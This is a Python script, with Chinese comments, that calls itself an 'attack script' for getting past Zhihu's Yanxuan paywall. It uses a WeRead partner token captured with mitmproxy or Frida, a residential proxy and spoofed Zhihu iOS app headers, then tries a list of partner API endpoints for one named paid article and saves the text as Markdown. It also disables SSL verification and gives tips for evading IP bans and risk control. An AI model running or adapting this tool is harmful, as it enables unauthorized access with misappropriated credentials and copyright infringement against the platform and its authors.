#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZCCSA-Auto v3.2 - 合作方Token攻击脚本
利用微信读书合作方Token + 住宅代理突破知乎盐选付费墙

使用方法：
1. 在下方 CONFIG 区域填入 partner_token 和住宅代理
2. 运行: python partner_token_attack.py
3. 成功后内容保存为 Markdown 文件
"""

import json
import re
import sys
import time
from datetime import datetime
from pathlib import Path

import requests

# ============================================================
# CONFIG - 请手动填入以下配置
# ============================================================

# 从微信读书App抓包提取的真实合作方Token
# 格式通常是: "Bearer xxx..." 或直接Token字符串，根据抓包结果调整
partner_token = ""  # <-- 填入你的Token

# 住宅代理地址（支持HTTP/HTTPS/SOCKS5）
# 格式示例:
#   HTTP:   "http://user:pass@host:port"
#   HTTPS:  "https://user:pass@host:port"
#   SOCKS5: "socks5://user:pass@host:port"
proxy_url = ""  # <-- 填入你的住宅代理

# 目标文章信息
ARTICLE_ID = "1979959692122943787"
ARTICLE_TITLE = "娇娇和她的忠犬小狗"
COLUMN_ID = "1979976139138147736"

# 输出目录
OUTPUT_DIR = Path("/workspace/zccsa/reports")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# API端点配置（多端点降级尝试）
# ============================================================

# 合作方API端点列表（按优先级排序，依次尝试）
API_ENDPOINTS = [
    # 微信读书合作方端点
    f"https://api.zhihu.com/partners/weread/sections/{ARTICLE_ID}",
    f"https://api.zhihu.com/partners/weread/v2/sections/{ARTICLE_ID}",
    f"https://api.zhihu.com/partners/weread/articles/{ARTICLE_ID}",
    # 通用合作方端点（Token有效时可能可用）
    f"https://api.zhihu.com/market/sections/{ARTICLE_ID}?include=content,author,paid_content",
    f"https://api.zhihu.com/v4/market/sections/{ARTICLE_ID}?include=content,author",
    f"https://api.zhihu.com/market/columns/{COLUMN_ID}/sections/{ARTICLE_ID}?include=content",
]


def count_cn(text: str) -> int:
    """统计中文字符数"""
    if not text:
        return 0
    return len(re.findall(r'[\u4e00-\u9fff]', text))


def build_headers(token: str) -> dict:
    """构建请求头"""
    headers = {
        # App端UA，模拟知乎iOS App
        "User-Agent": "ZhihuHybrid-iOS/8.10.0 (com.zhihu.ios; build:2400; iOS 16.0.0)",
        # 合作方标识
        "X-Partner-Id": "weread",
        "X-Partner-Name": "weread",
        "X-Partner-Version": "6.0.4",
        # App API版本
        "X-App-Version": "8.10.0",
        "X-Api-Version": "3.0.40",
        "X-App-Build": "2400",
        "X-App-Device": "iPhone14,2",
        "X-OS-Version": "16.0.0",
        "X-Network-Type": "WiFi",
        # 内容协商
        "Accept": "application/json",
        "Accept-Language": "zh-Hans-CN;q=1, en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        # 连接
        "Connection": "keep-alive",
    }
    # Authorization头：如果token已包含Bearer前缀则直接使用，否则添加
    if token:
        if token.lower().startswith("bearer "):
            headers["Authorization"] = token
        else:
            headers["Authorization"] = f"Bearer {token}"
    return headers


def build_proxies(proxy: str) -> dict:
    """构建代理配置"""
    if not proxy:
        return {}
    return {
        "http": proxy,
        "https": proxy,
    }


def recursive_find_content(obj, depth: int = 0, max_depth: int = 8) -> str:
    """
    递归遍历JSON对象，查找content/body等正文字段
    返回最长的中文内容
    """
    if depth > max_depth:
        return ""

    best_content = ""
    best_cn = 0

    if isinstance(obj, dict):
        for key, value in obj.items():
            # 优先匹配的字段名
            if key in ("content", "content_html", "body", "paid_content",
                      "full_content", "text", "article_content", "rich_content"):
                if isinstance(value, str):
                    cn = count_cn(value)
                    if cn > best_cn:
                        best_cn = cn
                        best_content = value
            # 递归查找
            found = recursive_find_content(value, depth + 1, max_depth)
            cn_found = count_cn(found)
            if cn_found > best_cn:
                best_cn = cn_found
                best_content = found

    elif isinstance(obj, list):
        for item in obj:
            found = recursive_find_content(item, depth + 1, max_depth)
            cn_found = count_cn(found)
            if cn_found > best_cn:
                best_cn = cn_found
                best_content = found

    return best_content


def extract_title_from_json(data: dict, fallback: str) -> str:
    """从JSON中尝试提取文章标题"""
    if isinstance(data, dict):
        # 递归查找title字段
        def find_title(o, d=0):
            if d > 5:
                return None
            if isinstance(o, dict):
                for k in ("title", "name", "section_title"):
                    v = o.get(k)
                    if isinstance(v, str) and len(v) > 2 and count_cn(v) > 0:
                        return v
                for v in o.values():
                    r = find_title(v, d+1)
                    if r:
                        return r
            elif isinstance(o, list):
                for it in o:
                    r = find_title(it, d+1)
                    if r:
                        return r
            return None
        t = find_title(data)
        if t:
            return t
    return fallback


def html_to_markdown(html: str) -> str:
    """简单的HTML到Markdown转换（用于content_html字段）"""
    if not html:
        return ""
    text = html
    # 段落
    text = re.sub(r'<p[^>]*>', '\n\n', text)
    text = re.sub(r'</p>', '\n', text)
    # 换行
    text = re.sub(r'<br\s*/?>', '\n', text)
    # 粗体
    text = re.sub(r'<strong[^>]*>(.*?)</strong>', r'**\1**', text, flags=re.S)
    text = re.sub(r'<b[^>]*>(.*?)</b>', r'**\1**', text, flags=re.S)
    # 斜体
    text = re.sub(r'<em[^>]*>(.*?)</em>', r'*\1*', text, flags=re.S)
    text = re.sub(r'<i[^>]*>(.*?)</i>', r'*\1*', text, flags=re.S)
    # 标题
    for i in range(1, 7):
        text = re.sub(f'<h{i}[^>]*>(.*?)</h{i}>', lambda m: '\n\n' + '#' * i + ' ' + m.group(1).strip() + '\n', text, flags=re.S)
    # 链接
    text = re.sub(r'<a[^>]*href="([^"]+)"[^>]*>(.*?)</a>', r'[\2](\1)', text, flags=re.S)
    # 列表
    text = re.sub(r'<li[^>]*>', '\n- ', text)
    text = re.sub(r'</li>', '', text)
    # 移除剩余HTML标签
    text = re.sub(r'<[^>]+>', '', text)
    # HTML实体解码
    text = text.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
    text = text.replace('&quot;', '"').replace('&#39;', "'")
    # 清理多余空行
    text = re.sub(r'\n{3,}', '\n\n', text)
    return text.strip()


def attack():
    """执行攻击主流程"""
    print("=" * 60)
    print("  ZCCSA-Auto v3.2 - 合作方Token攻击")
    print("=" * 60)
    print(f"  目标文章: {ARTICLE_TITLE}")
    print(f"  文章ID:   {ARTICLE_ID}")
    print(f"  时间:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # 配置校验
    if not partner_token:
        print("[错误] 请先在脚本顶部 CONFIG 区域填入 partner_token")
        print("       Token可通过mitmproxy/Frida抓取微信读书App的API请求获取")
        sys.exit(1)

    if not proxy_url:
        print("[警告] 未配置住宅代理，直接请求大概率被403封禁")
        print("       建议配置住宅代理后重试")
        print()

    headers = build_headers(partner_token)
    proxies = build_proxies(proxy_url)

    # 打印配置信息（Token脱敏显示）
    token_display = partner_token[:20] + "..." + partner_token[-10:] if len(partner_token) > 30 else partner_token
    print(f"[配置] Token: {token_display}")
    print(f"[配置] 代理:  {proxy_url or '无（直连）'}")
    print(f"[配置] UA:    {headers['User-Agent']}")
    print()

    # 准备Session（保持连接、复用Cookie）
    session = requests.Session()
    session.headers.update(headers)
    if proxies:
        session.proxies.update(proxies)
    # 禁用SSL验证（某些代理环境需要）
    session.verify = False

    # 抑制SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # 依次尝试每个API端点
    success = False
    result_data = None
    result_content = ""
    result_url = ""
    last_error = None

    for idx, url in enumerate(API_ENDPOINTS, 1):
        print(f"[尝试 {idx}/{len(API_ENDPOINTS)}] {url}")
        try:
            # 发送GET请求
            resp = session.get(url, timeout=20, allow_redirects=True)
            status = resp.status_code
            print(f"  HTTP状态: {status}")
            print(f"  响应长度: {len(resp.text)} 字节")

            # 检查HTTP状态
            if status == 403:
                try:
                    err_data = resp.json()
                    err_msg = err_data.get("error", {})
                    if isinstance(err_msg, dict):
                        err_msg = err_msg.get("message", str(err_msg))
                    print(f"  [失败] 403 Forbidden: {err_msg[:100] if err_msg else '无权限'}")
                    print(f"         -> 可能原因: Token无效/过期、IP被风控、Token权限不足")
                except Exception:
                    print(f"  [失败] 403 Forbidden: {resp.text[:100]}")
                last_error = f"403 Forbidden (endpoint {idx})"
                print()
                continue

            if status == 404:
                print(f"  [失败] 404 Not Found - 端点不存在")
                last_error = f"404 Not Found (endpoint {idx})"
                print()
                continue

            if status == 401:
                print(f"  [失败] 401 Unauthorized - Token认证失败，请检查Token格式和有效期")
                last_error = "401 Unauthorized"
                print()
                continue

            if status >= 500:
                print(f"  [失败] 服务器错误 {status}")
                last_error = f"Server error {status}"
                time.sleep(1)
                print()
                continue

            # 尝试解析JSON
            try:
                data = resp.json()
            except json.JSONDecodeError as e:
                # 不是JSON，可能是HTML页面（验证码/错误页）
                cn = count_cn(resp.text)
                if "安全验证" in resp.text or "验证" in resp.text[:500]:
                    print(f"  [失败] 触发安全验证（验证码），IP可能被风控")
                    last_error = "Captcha/Verification page"
                else:
                    print(f"  [失败] 响应不是JSON (cn={cn}): {resp.text[:200]}")
                    last_error = f"Non-JSON response: {resp.text[:100]}"
                print()
                continue

            result_data = data

            # 检查错误字段
            if isinstance(data, dict):
                err = data.get("error")
                if err:
                    err_msg = err.get("message", str(err)) if isinstance(err, dict) else str(err)
                    if "权限" in err_msg or "unauthorized" in err_msg.lower() or "forbidden" in err_msg.lower():
                        print(f"  [失败] API错误: {err_msg[:150]}")
                        last_error = err_msg
                        print()
                        continue
                    else:
                        print(f"  [警告] API返回错误: {err_msg[:100]}")

            # 递归查找内容
            content = recursive_find_content(data)
            cn = count_cn(content)
            print(f"  提取正文中文字数: {cn}")

            if cn > 500:
                # 内容足够长，判定为成功
                result_content = content
                result_url = url
                success = True
                print(f"  [成功] 获取到正文内容！")
                break
            elif cn > 50:
                # 有内容但较短，继续尝试其他端点，但记录下来
                print(f"  [部分成功] 内容较短(cn={cn})，继续尝试其他端点...")
                if not result_content or cn > count_cn(result_content):
                    result_content = content
                    result_url = url
                last_error = f"Content too short ({cn} chars)"
            else:
                # 打印JSON结构（前500字符）用于调试
                print(f"  [调试] 响应JSON预览: {json.dumps(data, ensure_ascii=False)[:300]}")
                last_error = f"No content field found (cn={cn})"

        except requests.exceptions.ProxyError as e:
            print(f"  [失败] 代理连接错误: {e}")
            last_error = f"Proxy error: {e}"
        except requests.exceptions.ConnectTimeout:
            print(f"  [失败] 连接超时")
            last_error = "Connection timeout"
        except requests.exceptions.ReadTimeout:
            print(f"  [失败] 读取超时")
            last_error = "Read timeout"
        except requests.exceptions.ConnectionError as e:
            print(f"  [失败] 连接错误: {e}")
            last_error = f"Connection error: {e}"
        except Exception as e:
            print(f"  [失败] 异常: {type(e).__name__}: {e}")
            last_error = f"{type(e).__name__}: {e}"

        print()
        time.sleep(1)  # 端点间间隔，避免触发风控

    # 结果处理
    print("=" * 60)
    if success or count_cn(result_content) > 500:
        # 成功获取内容
        title = extract_title_from_json(result_data, ARTICLE_TITLE) if result_data else ARTICLE_TITLE
        cn = count_cn(result_content)

        print(f"[成功] 文章获取完成！")
        print(f"  标题:     {title}")
        print(f"  正文字数: {cn} 中文字符")
        print(f"  来源URL:  {result_url}")
        print()

        # HTML转Markdown（如果内容是HTML）
        if "<" in result_content and ">" in result_content:
            md_content = html_to_markdown(result_content)
        else:
            md_content = result_content

        # 构建Markdown文档
        md_doc = f"""# {title}

> **来源**: 知乎盐选专栏  
> **文章ID**: {ARTICLE_ID}  
> **抓取时间**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
> **攻击向量**: 合作方Token（微信读书） + 住宅代理  
> **正文字数**: {cn} 字

---

{md_content}

---

*本文由 ZCCSA-Auto v3.2 通过合作方API自动抓取，仅用于安全研究目的。*
"""

        # 保存文件
        safe_title = re.sub(r'[\\/:*?"<>|\s]+', '_', title)[:50]
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        out_path = OUTPUT_DIR / f"zhihu_{safe_title}_{ts}.md"
        out_path.write_text(md_doc, encoding="utf-8")

        # 同时保存原始JSON
        if result_data:
            json_path = OUTPUT_DIR / f"zhihu_{safe_title}_{ts}_raw.json"
            json_path.write_text(json.dumps(result_data, ensure_ascii=False, indent=2), encoding="utf-8")

        print(f"[保存] Markdown: {out_path}")
        if result_data:
            print(f"[保存] 原始JSON: {json_path}")
        print()
        print("--- 内容预览（前500字）---")
        print()
        preview = md_content[:500]
        print(preview)
        if len(md_content) > 500:
            print("...")
        print()
        print("=" * 60)
        print("  攻击成功完成！")
        print("=" * 60)
        return str(out_path)
    else:
        # 全部失败
        print("[失败] 所有API端点均未返回完整内容")
        print()
        print(f"最后错误: {last_error}")
        print()
        print("排查建议：")
        print("  1. 确认Token格式是否正确（是否需要Bearer前缀？抓包看原始Header）")
        print("  2. 确认Token是否过期（重新从微信读书App抓包）")
        print("  3. 确认住宅代理是否真实有效（在浏览器中用代理访问 https://httpbin.org/ip 验证）")
        print("  4. 确认代理IP是住宅IP而非数据中心IP（访问 https://ipinfo.io 检查）")
        print("  5. 尝试在微信读书App中先打开该文章，再抓包确认API路径和Header")
        print("  6. 可能需要额外Header（如X-Zse-96签名），用mitmproxy完整抓包确认")
        print()
        if result_data:
            debug_path = OUTPUT_DIR / f"debug_response_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            debug_path.write_text(json.dumps(result_data, ensure_ascii=False, indent=2), encoding="utf-8")
            print(f"调试响应已保存: {debug_path}")
        print("=" * 60)
        sys.exit(1)


if __name__ == "__main__":
    attack()
